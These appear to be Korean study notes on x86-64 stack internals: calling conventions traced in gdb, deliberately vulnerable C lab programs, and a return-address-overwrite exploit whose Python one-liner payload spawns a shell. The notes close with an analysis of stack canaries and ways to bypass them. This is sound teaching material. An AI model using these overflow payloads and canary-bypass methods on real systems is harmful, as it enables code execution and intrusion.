=> 0x5555555545fa <callee>:	push   rbp
   0x5555555545fb <callee+1>:	mov    rbp,rsp
   0x5555555545fe <callee+4>:	mov    QWORD PTR [rbp-0x18],rdi
   0x555555554602 <callee+8>:	mov    DWORD PTR [rbp-0x1c],esi
   0x555555554605 <callee+11>:	mov    DWORD PTR [rbp-0x20],edx
```

callee 함수의 도입부를 살펴보면 가장 먼저 `push rbp`를 통해 호출자의 `rbp`를 저장한다. `rbp`는 스택 프레임의 가장 낮은 주소를 가리키기 때문에 Stack Frame Pointer(SFP)라고도 부른다. `callee`에서 반환될 때 SFP를 꺼내어 `caller`의 스택 프레임으로 돌아갈 수 있다.

```gdb
pwndbg> x/4gx $rsp
0x7fffffffdf08:	0x00007fffffffdf20	0x0000555555554682
0x7fffffffdf18:	0x0000000000000007	0x00007fffffffdf30
pwndbg> print $rbp
$1 = (void *) 0x7fffffffdf20
```

`push rbp`를 실행하고 스택을 살펴보면 `rbp`값인 0x00007fffffffdf20이 저장된 것을 확인할 수 있따.

##### 4. 스택 프레임 할당

```gdb
pwndbg> print $rbp
$2 = (void *) 0x7fffffffdf08
pwndbg> print $rsp
$3 = (void *) 0x7fffffffdf08
```

si를 실행하여 `mov rbp, rsp`로 `rbp`와 `rsp`가 같은 주소를 가리키게 한다. 바로 다음에 `rsp`의 값을 빼게 되면 `rbp`와 `rsp`의 사이 공간을 새로운 스택 프레임으로 할당하는 것이지만, callee 함수는 지역 변수를 사용하지 않기 때문에 새로운 스택 프레임을 만들지 않는다.

> ##### callee 함수에서 ret라는 지역 변수를 선언했지만 스택 프레임을 할당하지 않은 이유
> callee 함수에서 ret 변수는 반환값을 저장하는 용도로만 사용된다. gcc에서는 이런 변수에 대해 스택을 할당하지 않고 `rax`를 직접 사용한다.

##### 5. 반환값 전달

```gdb
pwndbg> print $rax
$4 = 123456789123456816
```

모든 연산을 마치고 함수의 종결부에 도달하면 반환값을 `rax`에 옮긴다. 반환 직전에 `rax`를 출력하면 전달한 인자의 합인 123456789123456816을 확인할 수 있다.

##### 6. 반환

```gdb
pwndbg> x/4i $rip
=> 0x555555554682 <caller+48>:	add    rsp,0x8
   0x555555554686 <caller+52>:	nop
   0x555555554687 <caller+53>:	leave  
   0x555555554688 <caller+54>:	ret    
pwndbg> print $rbp
$5 = (void *) 0x7fffffffdf20
pwndbg> print $rip
$6 = (void (*)()) 0x555555554682 <caller+48>
```

반환은 저장해뒀던 스택 프레임과 반환 주소를 꺼내면서 이루어진다. 여기서는 callee 함수가 스택 프레임을 만들지 않았기 때문에 `pop rbp`로 스택 프레임을 꺼낼 수 있지만, 일반적으로 `leave`로 스택 프레임을 꺼낸다. 스택 프레임을 꺼낸 뒤에는, `ret`로 호출자로 복귀합니다. 앞에서 저장해뒀던 SFP로 `rbp`가, 반환 주소로 `rip`가 설정된 것을 확인할 수 있다.

_x86 함수 호출 규약_

| 함수호출규약 | 사용 컴파일러 | 인자 전달 방식 | 스택 정리 | 적용          |
| ------------ | ------------- | -------------- | --------- | ------------- |
| stdcall      | MSVC          | Stack          | Callee    | WINAPI        |
| cdecl        | GCC, MSVC     | Stack          | Caller    | 일반 함수     |
| fastcall     | MSVC          | ECX, EDX       | Callee    | 최적화된 함수 |
|thiscall|MSVC|ECX(인스턴스), Stack(인자)|Callee|클래스의 함수|

_x86-64 함수 호출 규약_

| 함수호출규약 | 사용 컴파일러 | 인자 전달 방식                     | 스택 정리 | 적용                       |
| ------------ | ------------- | ---------------------------------- | --------- | -------------------------- |
| MS ABI       | MSVC          | RCX, RDX, R8, R9                   | Caller    | 일반 함수, Windows Syscall |
| System ABI   | GCC           | RDI, RSI, RDX, RCX, R8, R9, XMM0–7 | Caller    | 일반 함수                  |

## Stack Buffer Overflow
스택 버퍼 오버플로우는 세계적으로 널리 알려진 유명하고 오래된 취약점이다. CVE details에 따르면 오버플로우 취약점은 지금까지 발견된 취약점 중 3번째로 많다.

> ##### 스택 오버플로우와 스택 버퍼 오버플로우의 차이점
> 스택 영역은 실행중에 크기가 동적으로 확장될 수 있다. 그러나 한정된 크기의 메모리 안에서 스택이 무한히 확장될 수는 없다. 스택 오버플로우(Stack Overflow)는 스택 영역이 너무 많이 확장돼서 발생하는 버그를 뜻한다.
>
> 스택 버퍼 오버플로우는 스택에 위치한 버퍼에 버퍼의 크기보다 많은 데이터가 입력되어 발생하는 버그를 뜻한다.

### 버퍼 오버플로우
##### 버퍼
버퍼(Buffer)는 ‘완충 장치'라는 뜻으로, 컴퓨터 과학에서는 ‘데이터가 목적지로 이동되기 전에 보관되는 임시 저장소’의 의미로 쓰인다.
데이터의 처리속도가 다른 두 장치 사이를 오가는 데이터를 임시로 저장해 두는 것은 일종의 완충 작용을 한다. 이러한 과정이 없다면 입력 속도보다 처리 속도가 느릴 때 일부 데이터가 유실되는 문제가 발생할 수 있다. 이 때 버퍼를 사용하게 되면 송신 측은 버퍼로 데이터를 전송하고 수신 측은 버퍼에서 데이터를 꺼내 사용한다. 이렇게 하면 버퍼가 가득 찰 때까지는 유실되는 데이터 없이 통신할 수 있다.
현대에는 이런 완충의 의미가 많이 희석되어 데이터가 저장될 수 있는 모든 단위를 버퍼라고 부르기도 한다. 스택에 있는 지역 변수는 '스택 버퍼', 힙에 할당된 메모리 영역은 '힙 버퍼'라고 한다.

> ##### 버퍼링
> 흔히 사용하는 '버퍼링'이라는 단어는 버퍼에서 유래한 것으로, 송신 측의 전송 속도가 느려서 수신 측의 버퍼가 채워질 때까지 대기하는 것을 의미한다.

##### 버퍼 오버플로우
버퍼 오버플로우(Buffer Overflow)는 버퍼가 넘치는 것을 의미한다. 버퍼는 각기 다른 크기를 가진다. 그 예시로 int로 선언된 지역 변수는 4바이트의 크기를 갖고 10개의 원소를 갖는 char 배열은 10바이트의 크기를 갖는다. 버퍼에 할당된 크기보다 큰 데이터가 들어오면 오버플로우가 발생한다. 일반적으로 버퍼는 메모리상에 연속해서 할당되어 있기 때문에 어떤 버퍼에서 오버플로우가 발생하면 뒤에 있는 버퍼들의 값이 조작될 위험이 있다.

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/8b5ccbb5bc4cfcaeae8e88d8bde55d710ca579946645171d8bb6923c46aacf6a.png)

### 중요 데이터 변조
버퍼 오버플로우가 발생하는 버퍼 뒤에 중요한 데이터가 있다면 해당 데이터가 변조됨으로써 문제가 발생할 수 있다.

```C
// Name: sbof_auth.c
// Compile: gcc -o sbof_auth sbof_auth.c -fno-stack-protector

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_auth(char *password)
{
	int auth = 0;
	char temp[16];

	strncpy(temp, password, strlen(password));

	if (!strcmp(temp, "SECRET_PASSWORD"))
		auth = 1;

	return auth;
}

int main(int argc, char *argv[])
{
	if (argc != 2) {
		printf("Usage: ./sbof_auth ADMIN_PASSWORD\n");
		exit(-1);
	}

	if (check_auth(argv[1]))
		printf("Hello Admin!\n");
	else
		printf("Access Denied!\n");
}
```

위의 코드에서 main 함수는 argv[1]을 check_path 함수의 인자로 전달하고 반환값을 받아온다. 여기서 반환 값이 0이 아니라면 "Hello Admin!"을 아니면 "Access Denied!"라는 문자열을 출력한다. check_path 함수는 16바이트 크기의 temp 버퍼에 입력받은 패스워드를 복사하고 이를 "SECRET_PASSWORD" 문자열과 비교하여 문자열이 같다면 auth를 1로 설정하고 반환한다.
check_auth 함수는 strncpy 함수로 temp 버퍼를 복사할 때 temp의 크기인 16바이트가 아닌 password의 크기만큼 복사한다. 따라서 여기에서 스택 버퍼 오버플로우가 발생한다. auth는 temp 버퍼 뒤에 존재하기 때문에 temp 버퍼에서 오버플로우가 발생하면 auth의 값을 0이 아닌 임의의 값으로 바꿀 수 있다.

![[2.png]]

### 데이터 유출
C언어에서 정상적인 문자열은 널바이트로 종결되며 표준 문자열 출력 함수들은 널바이트를 문자열의 끝으로 인식한다. 따라서 어떤 버퍼에 오버플로우를 발생시켜서 다른 버퍼와의 사이에 있는 널바이트를 모두 제거하면 해당 버퍼를 출력시켜서 다른 버퍼의 데이터를 읽을 수 있다. 획득한 데이터는 각종 보호기법을 우회하는데 사용될 수 있으며, 해당 데이터 자체가 중요한 정보일 수도 있다.

```C
// Name: sbof_leak.c
// Compile: gcc -o sbof_leak sbof_leak.c -fno-stack-protector

#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void)
{
	char secret[16] = "secret message";
	char barrier[4] = {};
	char name[8] = {};

	memset(barrier, 0, 4);

	printf("Your name : ");
	read(0, name, 12);

	printf("Your name is %s.", name);
}
```

위의 코드에서 8바이트 크기의 name 버퍼에 12바이트의 입력을 받는다. 읽고자 하는 데이터인 secret 버퍼와의 사이에 barrier라는 4바이트의 널 배열이 존재하는데 오버플로우를 이용하여 널 바이트를 모두 다른 값으로 변경하면 secret을 읽을 수 있다.

![[3.png]]

### 실행 흐름 조작
함수를 호출할 때 반환 주소를 스택에 쌓고 함수에서 반환될 때 이를 꺼내어 원래의 실행 흐름으로 돌아간다. 여기서 스택 버퍼 오버플로우를 이용해서 반환 주소를 조작하면 프로세스의 흐름을 제어할 수 있다.

![[4.png]]

0x4141414141414141를 Hex Decode 하면 AAAAAAAA이므로 이를 ret 영역에 입력하면 된다.

## Return Address Overwrite

```C
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init()
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

void get_shell()
{
	char *cmd = "/bin/sh";
	char *args[] = {cmd, NULL};

	execve(cmd, args, NULL);
}

int main()
{
	char buf[0x28];

	init();

	printf("Input : ");
	scanf("%s", buf);

	return 0;
}
```

### 취약점 분석
위의 프로그램의 scanf("%s", buf)에서 취약점이 발생한다. scanf의 포맷 스트링 중 %s는 문자열을 입력받을 때 사용하며 입력의 길이를 제한하지 않고 공백 문자인 띄어쓰기, 탭, 개행 문자 등이 들어올 때까지 계속 입력을 받는다. 이 때문에 버퍼의 크기보다 큰 데이터를 입력했을 때 오버플로우가 발생할 수 있다. 따라서 이를 예방하기 위해 scanf의 포맷 스트링으로 %s가 아니라 정확히 n개의 문자만을 입력받도록 %[n]s의 형태로 사용해야 한다.
scanf 함수 외에도 C/C++의 표준 함수 중 버퍼를 다루면서 길이를 입력하지 않는 함수들은 대부분 위험하다고 볼 수 있다. 이러한 함수에는 대표적으로 strcpy, strcat, strintf가 있다. 위의 프로그램에서는 크기가 0x28인 버퍼에 scanf("%s", buf)로 입력을 받기 때문에 버퍼 오버플로우를 통해 main 함수의 반환 주소를 공격할 수 있다.

> ##### C/C++의 문자열 종결자(Terminator)와 표준 문자열 함수들의 취약성
> C계열 언어에서는 널바이트(“\x00”)로 종료되는 데이터 배열을 문자열로 취급하며 문자열을 다루는 대부분의 표준 함수는 널바이트를 만날 때까지 연산을 진행한다. 여기서 만약 배열에 널바이트가 없다면 문자열 함수는 널바이트를 찾을 때까지 배열을 참조하므로 코드를 작성할 때 정의한 배열의 크기를 넘어서도 계속해서 인덱스를 증가시킨다. 이런 동작으로 인해 참조하려는 인덱스 값이 배열의 크기보다 커지는 현상을 Index Out-of-Bound(OOB)라고 하며 이 버그를 발생시키는 취약점을 Out-Of-Bound(OOB) 취약점이라고 한다.
> OOB를 이용하여 해커는 프로그래머가 의도하지 않은 주소의 데이터를 읽거나 조작할 수 있고 몇몇 조건이 만족되면 소프트웨어에 심각한 오동작을 일으킬 수도 있다. 이를 방지하기 위해 개발자는 입력의 길이를 제한하는 문자열 함수를 사용해야 하며 문자열을 사용할 때는 반드시 해당 문자열이 널바이트로 종결되는지 확인해야 한다.

### 트리거
발견한 취약점을 확인하는 행위를 취약점을 발현시킨다는 뜻에서 트리거(trigger)라고 한다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage5 
╰─$ ./rao 
Input : AAAAA
╭─kakunge@ubuntu ~/Documents/syshack/stage5 
╰─$ ./rao
Input : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    17896 segmentation fault (core dumped)  ./rao
```

예제 프로그램을 컴파일하여 실행했을 때, 짧은 입력에 대해서는 특별한 반응이 없지만 "A"를 64개 입력했을 때는 segmentation fault 에러가 발생한다. 이것은 프로그램이 잘못된 메모리 주소에 접근했다는 의미이며 프로그램에 버그가 발생했다는 신호이다. (core dumped)는 코어 파일(core)을 생성했다는 뜻으로 프로그램이 비정상적으로 종료됐을 때 디버깅을 돕기 위해 운영체제가 생성해주는 것이다.

> ##### 코어 파일
> 리눅스는 기본적으로 코어 파일의 크기에 제한을 두고 있다. 바이너리가 segmentation fault를 발생시키고도 코어 파일을 생성하지 않았다면 생성해야할 코어 파일의 크기가 이를 초과했기 때문이다.
> ```zsh
> $ ulimit -c unlimited
> ```
> 위 명령어로 제한을 해제하고 다시 오류를 발생시키면 코어 파일을 얻을 수 있다.

### 코어 파일 분석
gdb를 이용해서 코어 파일을 분석하여 셸코드를 작성하기 위한 계획을 세울 수 있다.

> ##### 코어 파일 생성 위치
> 이 과정에서 기본적으로 코어 파일의 생성 위치가 현재 디렉토리가 아니었다. 따라서 다음의 과정을 거쳐 현재 디렉토리에 코어 파일이 생성되도록 하였다.
> 1. root 유저로 변경
> 
> ```zsh
> $ sudo -s
> ```
> 2. 다음 명령 실행
> 
> ```zsh
> $ echo "core.%e.%p" > /proc/sys/kernel/core_pattern
> ```
> 
> 3. 기존 계정으로 복귀
> 
> ```zsh
> $ exit
> ```

다음 명령어를 통해 gdb로 코어 파일을 불러온다.

```zsh
$ sudo gdb ./rao ./core.rao.22892
```

```gdb
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
 ► 0x400729 <main+65>    ret    <0x4141414141414141>



───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc8fd721d8 ◂— 'AAAAAAAAAAA'
01:0008│     0x7ffc8fd721e0 ◂— 0x414141 /* 'AAA' */
02:0010│     0x7ffc8fd721e8 —▸ 0x7ffc8fd722b8 —▸ 0x7ffc8fd737c0 ◂— 0x414c006f61722f2e /* './rao' */
03:0018│     0x7ffc8fd721f0 ◂— 0x100008000
04:0020│     0x7ffc8fd721f8 —▸ 0x4006e8 (main) ◂— push   rbp
05:0028│     0x7ffc8fd72200 ◂— 0x0
06:0030│     0x7ffc8fd72208 ◂— 0x81351b7a424cfd41
07:0038│     0x7ffc8fd72210 —▸ 0x400580 (_start) ◂— xor    ebp, ebp
```

디스어셈블된 코드와 스택을 살펴보면 main 함수에서 `ret`을 실행하려고 할 때 스택 최상단의 값이 입력값의 일부인 0x4141414141414141 ('AAAAAAAA')인 것을 알 수 있다. 이것은 실행가능한 메모리의 주소가 아니기 때문에 segmentation fault가 발생한 것이다. 이를 이용하여 main 함수의 반환 주소를 조작할 수 있다.

### 스택 프레임 구조 파악
스택 버퍼에 오버플로우를 발생시켜서 반환주소를 조작하기 위해 해당 버퍼가 스택 프레임의 어디에 위치하는지 조사해야 한다. 이를 위해 main 함수에서 scanf에 인자를 전달하는 부분을 살펴본다.

```gdb
pwndbg> nearpc 0x40071e
   0x400706 <main+30>            call   printf@plt                      <printf@plt>
 
   0x40070b <main+35>            lea    rax, [rbp - 0x30]
   0x40070f <main+39>            mov    rsi, rax
   0x400712 <main+42>            lea    rdi, [rip + 0xac]
   0x400719 <main+49>            mov    eax, 0
 ► 0x40071e <main+54>            call   __isoc99_scanf@plt                      <__isoc99_scanf@plt>
 
   0x400723 <main+59>            mov    eax, 0
   0x400728 <main+64>            leave  
   0x400729 <main+65>            ret    <0x4141414141414141>
```

이를 의사코드로 나타내면 다음과 같다.

```C
scanf("%s", (rbp-0x30));
```

따라서 오버플로우를 발생시킬 버퍼는 `rbp-0x30`에 위치한다. 스택 프레임의 구조를 떠올려 보면 `rbp`에 스택 프레임 포인터(SFP)가 저장되고 `rbp+0x8`에는 반환 주소가 저장된다. 이를 바탕으로 스택 프레임을 그려보면 다음과 같다.

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/ba14b1d45d74d46ab7f84d20ec60a4806f9d42bb29d2fb6f434cf152d9b0a76c.png)

입력할 버퍼와 반환 주소 사이에 0x38만큼의 거리가 있으므로 그만큼을 쓰레기 값(dummy data)으로 채우고 실행하고자 하는 코드의 주소를 입력하면 실행 흐름을 조작할 수 있다.

### get_shell() 주소 확인
여기서는 셸을 실행하는 get_shell() 함수가 존재하므로 이 함수의 주소로 main 함수의 반환 주소를 조작하여 셸을 획득할 수 있다.

```gdb
pwndbg> print get_shell
$1 = {<text variable, no debug info>} 0x4006aa <get_shell>
```

gdb를 이용해서 get_shell() 함수의 주소를 알 수 있다.

### 페이로드 구성
시스템 해킹에서 페이로드는 공격을 위해 프로그램에 전달하는 데이터를 의미한다.

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/e79856b99a85ced26cb4e73e84bf7c9c8db109eaadc3906fc61777e54f932f32.png)

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/dc7b3ad98e722b03d5bcf32a7411f034fde57f6d4639481e861ff2c63cbf8890.png)

위와 같이 페이로드를 구성하여 셸을 실행할 수 있다.

### 엔디언 적용
구성한 페이로드는 적절한 엔디언(Endian)을 적용해서 프로그램에 전달해야 한다. 엔디언은 메모리에서 데이터가 정렬되는 방식으로 주로 리틀 엔디언(Little-Endian, LE)과 빅 엔디언(Big-Endian, BE)이 사용된다.
리틀 엔디언에서는 데이터의 Most Significant Byte(MSB; 가장 왼쪽의 바이트)가 가장 높은 주소에 저장되고 빅 엔디언에서는 데이터의 MSB가 가장 낮은 주소에 저장된다.

실습에 사용된 환경인 x86-64 아키텍처에서는 리틀 엔디안을 사용한다. 따라서 get_shell() 함수의 주소인 0x4006aa를 "\xaa\x06\x40\x00\x00\x00\x00\x00"으로 전달해야 한다.

### 익스플로잇
적절한 엔디언을 적용한 페이로드를 파이썬의 출력으로 하여 rao에 전달하여 셸을 실행한다.

```zsh
(python3 -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao
```

```sh
echo $0
/bin/sh
```

성공적으로 셸을 획득하였다.

### 취약점 패치
취약점을 패치하는 것은 취약점을 발견하는 것만큼 중요하다.

##### rao
rao에서는 위험한 문자열 입력함수를 사용하여 취약점이 발생했다. 다음은 C언어에서 자주 사용되는 문자열 입력 함수와 패턴들이다.

| 입력 함수(패턴)         | 위험도    | 평가 근거                                                                                                                                                                                                                                                                                                                                                                                                   |
| ----------------------- | --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| gets(buf)               | 매우 위험 | - 입력받는 길이에 제한이 없음.<br>- 버퍼의 널 종결을 보장하지 않음: 입력의 끝에 널바이트를 삽입하므로, 버퍼를 꽉채우면 널바이트로 종결되지 않음. 이후 문자열 관련 함수를 사용할 때 버그가 발생하기 쉬움.                                                                                                                                                                                                    |
| scanf(“%s”, buf)        | 매우 위험 | - 입력받는 길이에 제한이 없음.<br>- 버퍼의 널 종결을 보장하지 않음: gets와 동일.                                                                                                                                                                                                                                                                                                                            |
| scanf(“%[width]s”, buf) | 주의 필요 | - len만큼만 입력받음: len을 설정할 때 len <= size(buf)을 만족하지 않으면 오버플로우가 발생할 수 있음.<br>- 버퍼의 널 종결을 보장함.<br>- len보다 적게 입력하면, 입력의 끝에 널바이트 삽입.<br>- len만큼 입력하면 입력의 마지막 바이트를 버리고 널바이트 삽입.<br>- 데이터 유실 주의: 버퍼에 담아야 할 데이터가 30바이트인데 버퍼의 크기와 len을 30으로 작성하면 29바이트만 저장되고 마지막 바이트는 유실됨. |

> scanf("%[n]s", buf)는 입력의 끝에 널바이트를 삽입한다. 따라서 buf의 크기와 n이 동일할 경우 버퍼의 뒤에 널바이트가 삽입될 수 있다. 이를 널바이트 오버플로우(null-byte overflow)라고 부르며 경우에 따라 심각한 보안 위협이 될 수 있다.


# Stage 6 : Stack Canary
스택 버퍼 오버플로우의 반환 주소를 보호하는 기법.
스택 카나리는 함수의 프롤로그에서 스택 버퍼와 반환 주소 사이에 임의의 값을 삽입하고 함수의 에필로그에서 해당 값의 변조를 확인한다. 스택 버퍼 오버플로우로 반환 주소를 덮기 위해서는 카나리를 먼저 덮어야 하므로 카나리를 모르면 카나리 값을 변조하게 되어 함수의 에필로그에서 공격을 실패하게 된다.

## Stack Canary
### 카나리 정적 분석

```C
// Name: canary.c

#include <unistd.h>

int main()
{
	char buf[8];
	read(0, buf, 32);
	
	return 0;
}
```

위의 코드는 스택 버퍼 오버플로우 취약점이 존재한다. 이를 카나리의 작동 유무에 따라 컴파일된 바이너리를 비교하여본다.

##### 카나리 비활성화
Ubuntu 18.04의 gcc는 기본적으로 스택 카나리를 적용하여 컴파일한다. 컴파일할 때  `-fno-stack-protector` 옵션을 추가하여 카나리를 적용하지 않고 컴파일할 수 있다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage6 
╰─$ gcc -o no_canary canary.c -fno-stack-protector
╭─kakunge@ubuntu ~/Documents/syshack/stage6 
╰─$ ./no_canary 
AAAAAAAAAAAAAAAA
[1]    6978 segmentation fault (core dumped)
```

카나리를 적용하지 않고 컴파일하여 실행하고 길이가 긴 입력을 하면 `segmentation fault` 에러가 발생한다.

##### 카나리 활성화

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage6 
╰─$ gcc -o canary canary.c
╭─kakunge@ubuntu ~/Documents/syshack/stage6 
╰─$ ./canary
AAAAAAAAAAAAAAAA
*** stack smashing detected ***: <unknown> terminated
[1]    7903 abort (core dumped)
```

카나리를 적용하여 컴파일하고 같은 입력을 주면 `segmentation fault`이 아닌 `stack smashing detected`와 `abort` 에러가 발생한다. 이는 스택 버퍼 오버플로우가 탐지되어 프로세스가 강제 종료되었음을 의미한다.

```gdb
no_canary

   0x000000000000063a <+0>:	    push   rbp
   0x000000000000063b <+1>:	    mov    rbp,rsp
   0x000000000000063e <+4>:	    sub    rsp,0x10
   0x0000000000000642 <+8>:	    lea    rax,[rbp-0x8]
   0x0000000000000646 <+12>:	mov    edx,0x20
   0x000000000000064b <+17>:	mov    rsi,rax
   0x000000000000064e <+20>:	mov    edi,0x0
   0x0000000000000653 <+25>:	call   0x510 <read@plt>
   0x0000000000000658 <+30>:	mov    eax,0x0
   0x000000000000065d <+35>:	leave  
   0x000000000000065e <+36>:	ret
```

```gdb
canary

   0x00005555555546aa <+0>:	    push   rbp
   0x00005555555546ab <+1>:	    mov    rbp,rsp
   0x00005555555546ae <+4>:	    sub    rsp,0x10
   0x00005555555546b2 <+8>:	    mov    rax,QWORD PTR fs:0x28
   0x00005555555546bb <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00005555555546bf <+21>:	xor    eax,eax
   0x00005555555546c1 <+23>:	lea    rax,[rbp-0x10]
   0x00005555555546c5 <+27>:	mov    edx,0x20
   0x00005555555546ca <+32>:	mov    rsi,rax
   0x00005555555546cd <+35>:	mov    edi,0x0
   0x00005555555546d2 <+40>:	call   0x555555554580 <read@plt>
   0x00005555555546d7 <+45>:	mov    eax,0x0
   0x00005555555546dc <+50>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00005555555546e0 <+54>:	xor    rcx,QWORD PTR fs:0x28
   0x00005555555546e9 <+63>:	je     0x5555555546f0 <main+70>
   0x00005555555546eb <+65>:	call   0x555555554570 <__stack_chk_fail@plt>
   0x00005555555546f0 <+70>:	leave  
   0x00005555555546f1 <+71>:	ret
```

no_canary와 canary를 각각 디스어셈블하여 비교해보면 추가된 코드를 확인할 수 있다.

### 카나리 동적 분석
##### 카나리 저장
추가된 프롤로그 코드에 BP를 설정하여 실행한다.

```gdb
 ► 0x5555555546b2 <main+8>     mov    rax, qword ptr fs:[0x28]      <main>
   0x5555555546bb <main+17>    mov    qword ptr [rbp - 8], rax
   0x5555555546bf <main+21>    xor    eax, eax
```

`main+8`은 `fs:0x28`의 데이터를 `rax`에 저장한다. `fs`는 세그먼트 레지스터의 일종으로 리눅스는 프로세스가 시작될 때 `fs:0x28`에 랜덤 값을 저장한다. 즉, 여기서는 `rax`에 리눅스가 생성한 랜덤한 값이 저장된다.

```gdb
pwndbg> print /a $rax
$1 = 0xbcae377c44674a00
```

코드를 한 줄 실행시켜서 확인해보면 `rax`에 첫 바이트가 널 바이트인 8바이트 문자열이 입력된 것을 알 수 있다.

```gdb
   0x5555555546bb <main+17>    mov    qword ptr [rbp - 8], rax
 ► 0x5555555546bf <main+21>    xor    eax, eax
```

생성된 값은 `main+17`에서 `rbp-0x8`에 저장된다.

> ##### fs
> cs, ds, es는 CPU가 사용 목적을 명시한 레지스터인 반면 fs와 gs는 목적이 정해지지 않아 운영체제가 임의로 사용할 수 있는 레지스터이다. 리눅스는 fs를 Thread Local Storage(TLS)를 가리키는 포인터로 사용한다.

##### 카나리 검사
`main+50`은 `rbp-8`에 저장한 카나리를 `rcx`로 옮긴다. 그 후 `main+54`에서 `rcx`를 `fs:0x28`에 저장된 카나리와 xor한다. 두 값이 동일하면 연산 결과가 0이되면서 `je`의 조건을 만족하고 `main`함수는 정상적으로 반환된다. 그러나 두 값이 동일하지 않으면 `__stack_chk_fail`이 호출되면서 프로그램이 강제로 종료된다.

여기서는 16개의 'A'를 입력으로 하여 카나리를 변조한다.

```gdb
pwndbg> print /a $rcx
$2 = 0x4141414141414141
```

코드를 한 줄 실행시키면 `rbp-0x8`에 저장된 값이 0x4141414141414141인 것을 확인할 수 있다. `main+54`의 연산 결과가 0이 아니기 때문에 `main+63`에서 `main+70`으로 분기하지 않고 `main+65`의 `__stack_chk_fail`을 실행하게 된다.

```gdb
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
```

함수가 실행되면 위의 에러와 함께 프로그램이 종료된다.

### 카나리 생성 과정
카나리 값은 프로세스가 시작될 때 TLS에 전역 변수로 저장되고 각 함수마다 프롤로그와 에필로그에서 이 값을 참조한다.

##### TLS의 주소 파악
`fs`는 TLS를 가리키므로 `fs`의 값을 알면 TLS의 주소를 알 수 있다. 그러나 리눅스에서 `fs`의 값은 특정 시스템 콜을 사용해야만 조회하거나 설정할 수 있기 때문에 gdb에서 다른 레지스터의 값을 출력하는 것처럼 `info register fs`나 `print $fs`와 같은 방식으로는 값을 알 수 없다.
여기서는 `fs`의 값을 설정할 때 호출되는 `arch_prctl(int code, unsigned long addr)` 시스템 콜에 중단점을 설정하여 `fs`가 어떤 값으로 설정되는지 조사한다. 이 시스템 콜을 `arch_prctl(ARCH_SET_FS, addr)`의 형태로 호출하면 `fs`의 값은 `addr`로 설정된다.
gdb에서 특정 이벤트가 발생했을 때 프로세스를 중지시키는 catch 명령어로 `arch_prctl`에 catchpoint를 설정하고 앞서 사용했던 `canary`를 실행한다.

```gdb
pwndbg> catch syscall arch_prctl
Catchpoint 1 (syscall 'arch_prctl' [158])
pwndbg> r
```

```gdb
*RDI  0x1002
*RSI  0x7ffff7fe34c0 ◂— 0x7ffff7fe34c0
```

catchpoint에 도달했을 때 `rdi`의 값이 `0x1002`인데 이 값은 `ARCH_SET_FS`의 상숫값이다. `rsi`의 값이 `0x7ffff7fe34c0`이므로 이 프로세스는 TLS를 `0x7ffff7fe34c0`에 저장하고 `fs`는 이를 가리키게 될 것이다.

```gdb
pwndbg> info register $rsi
rsi            0x7ffff7fe34c0	140737354020032
pwndbg> x/gx 0x7ffff7fe34c0+0x28
0x7ffff7fe34e8:	0x0000000000000000
```

카나리가 저장될 `fs+0x28`(`0x7ffff7fe34c0+0x28`)의 값을 보면 아직 어떠한 값도 설정되어 있지 않은 것을 확인할 수 있다.

##### 카나리 값 설정
gdb의 watch 명령어로 TLS+0x28에 값을 쓸 때 프로세스를 중단시킨다. watch는 특정 주소에 저장된 값이 변경되면 프로세스를 중단시키는 명령어이다.

```gdb
pwndbg> watch *(0x7ffff7fe34e8+0x28)
Hardware watchpoint 3: *(0x7ffff7fe34e8+0x28)
```

```gdb
Hardware watchpoint 3: *(0x7ffff7fe34c0+0x28)

Old value = 0
New value = -1800072960
security_init () at rtld.c:807
807	in rtld.c
```

TLS+0x28의 값을 조회하면 `0x0c28995d94b51100`이 카나리로 설정된 것을 확인할 수 있다.

```gdb
pwndbg> x/gx 0x7ffff7fe34c0+0x28
0x7ffff7fe34e8:	0x0c28995d94b51100
```

`mov rax,QWORD PTR fs:0x28`를 실행하고 rax 값을 확인해보면 `security_init`에서 설정한 값과 같은 것을 확인할 수 있다.

```gdb
pwndbg> i r $rax
rax            0xc28995d94b51100	876118754729464064
```

### 카나리 우회
##### 무차별 대입(Brute Force)
x64 아키텍처에서는 8바이트의 카나리가 생성되며, x86 아키텍처에서는 4바이트의 카나리가 생성된다. 각각의 카나리에는 널 바이트가 포함되어 있기 때문에 실제로는 7바이트와 3바이트의 랜덤한 값이 포함된다. 따라서 무차별 대입으로 x64 아키텍처의 카나리 값을 알아내려면 최대 256^7번, x86에서는 최대 256^3 번의 연산이 필요하다. 이는 현실적으로 실제 서버를 대상으로는 불가능한 수치이다.

##### TLS 접근
카나리는 TLS에 전역변수로 저장되며 매 함수마다 이를 참조해서 사용한다. TLS의 주소는 매 실행마다 바뀌지만 만약 실행중에 TLS의 주소를 알 수 있고 임의 주소에 대한 읽기 또는 쓰기가 가능하다면 TLS에 설정된 카나리 값을 읽거나 이를 임의의 값으로 조작할 수 있다. 그 후 스택 버퍼 오버플로우를 수행할 때 알아낸 카나리 값 또는 조작한 카나리 값으로 스택 카나리를 덮으면 함수의 에필로그에 있는 카나리 검사를 우회할 수 있다.

##### 스택 카나리 릭
